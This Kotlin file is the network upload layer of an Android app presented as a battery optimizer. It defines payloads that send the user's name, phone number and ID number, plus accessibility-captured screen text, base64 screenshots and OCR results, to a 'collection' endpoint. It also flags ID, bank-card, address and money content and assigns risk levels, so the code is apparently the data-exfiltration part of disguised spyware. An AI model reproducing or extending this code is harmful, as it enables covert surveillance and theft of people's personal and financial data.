package com.android.batteryoptimization.network

import com.android.batteryoptimization.InputEvent
import com.google.gson.annotations.SerializedName
import okhttp3.ResponseBody
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

data class UploadResponse(
    @SerializedName("code") val code: Int,
    @SerializedName("msg") val msg: String
)

data class UploadRequest(
    @SerializedName("userInfo") val userInfo: UserInfoPayload,
    @SerializedName("events") val events: List<EventPayload>
)

data class UserInfoPayload(
    @SerializedName("name") val name: String,
    @SerializedName("phone") val phone: String,
    @SerializedName("idCard") val idCard: String
)

/** OCR 单行识别结果 */
data class OcrDetailPayload(
    @SerializedName("text") val text: String,
    @SerializedName("confidence") val confidence: Float,
    @SerializedName("boundingBox") val boundingBox: String? = null
)

/** 敏感信息标记（后端可据此做脱敏/展示） */
data class SensitiveInfoPayload(
    @SerializedName("hasIdCard") val hasIdCard: Boolean = false,
    @SerializedName("hasPhone") val hasPhone: Boolean = false,
    @SerializedName("hasBankCard") val hasBankCard: Boolean = false,
    @SerializedName("hasAddress") val hasAddress: Boolean = false,
    @SerializedName("hasMoney") val hasMoney: Boolean = false
)

data class EventPayload(
    @SerializedName("packageName") val packageName: String,
    @SerializedName("appName") val appName: String?,
    @SerializedName("text") val text: String,
    @SerializedName("timestamp") val timestamp: Long,
    @SerializedName("source") val source: String = "accessibility",

    // ── 截屏 OCR 相关（source="ocr" 时携带） ──
    /** 截屏图片的 JPEG base64（压缩后） */
    @SerializedName("screenshotBase64") val screenshotBase64: String? = null,
    /** OCR 识别出的完整文本（多行拼接） */
    @SerializedName("ocrText") val ocrText: String? = null,
    /** OCR 每行详细识别结果 */
    @SerializedName("ocrDetails") val ocrDetails: List<OcrDetailPayload>? = null,

    // ── 内容分类（用于后台展示） ──
    /** 内容类型：chat / contract / form / finance / other */
    @SerializedName("contentType") val contentType: String? = null,
    /** 风险等级：low / medium / high */
    @SerializedName("riskLevel") val riskLevel: String? = null,
    /** 敏感信息标记 */
    @SerializedName("sensitiveInfo") val sensitiveInfo: SensitiveInfoPayload? = null
)

interface UploadApi {
    @POST("app/collection/collect")
    suspend fun uploadEvents(
        @Header("deviceInfo") deviceInfoJson: String,
        @Body requestBody: UploadRequest
    ): ResponseBody
}
